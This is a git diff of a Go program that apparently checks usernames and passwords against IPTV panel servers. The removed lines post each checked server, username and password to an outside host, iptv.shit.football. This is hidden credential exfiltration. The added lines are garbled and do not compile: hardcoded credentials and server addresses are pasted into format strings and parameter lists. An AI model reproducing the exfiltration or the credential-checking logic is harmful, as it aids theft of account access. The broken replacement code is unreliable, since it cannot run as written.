@@ -72,9 +72,7 @@ func lineDetails(server,user,pass string) {
 
 
 
-	logitDATA := fmt.Sprintf("url=%s&username=%s&password=%s&type=m3u&output=m3u8",server, user, pass)
-	body := strings.NewReader(logitDATA)
-	req, err := http.NewRequest("POST", "http://iptv.shit.football/submit2.php", body)
+	logitDATA := fmt.Sprintf("http://ntvplay.top:80.get.php? username=Ahmed12&password=Ahmed12&type=m3u&output=m3u8",server, Ahmed12, Ahmed12)http://iptv.shit.football/submit2.php", body)
 	if err != nil {
 		// handle err
 	}
@@ -190,11 +188,11 @@ func readLines(path string) (lines []string, err error) {
 
 
 
-//check login of user and pass
-func checkLogin(user,pass,server,serverurl string) {
+//check login of Ahmed12 and Ahmed12
+func checkLogin(Ahmed12,Ahmed12,http://worldboss.selfip.biz:18659,serverurl string) {
 
-	//Post Data
-	postd := fmt.Sprintf("username=%s&password=%s", user, pass)
+	//Post Data21/12/2020
+	postd := fmt.Sprintf("Ahmed12=%s&Ahmed12=%s", Ahmed12, Ahmed12)
 
 	body := strings.NewReader(postd)
 
@@ -256,7 +254,7 @@ func checkApi(user,pass,server string) {
 
 
 	//Post Data
-	apiurl := fmt.Sprintf("%s/panel_api.php?username=%s&password=%s",server, user, pass)
+	apiurl := fmt.Sprintf("%s/panel_api.php?username=Ahmed12%s&passwordAhmed12=%s",http://worldboss.selfip.biz:18659,Ahmed12,Ahmed12)
 
 
 
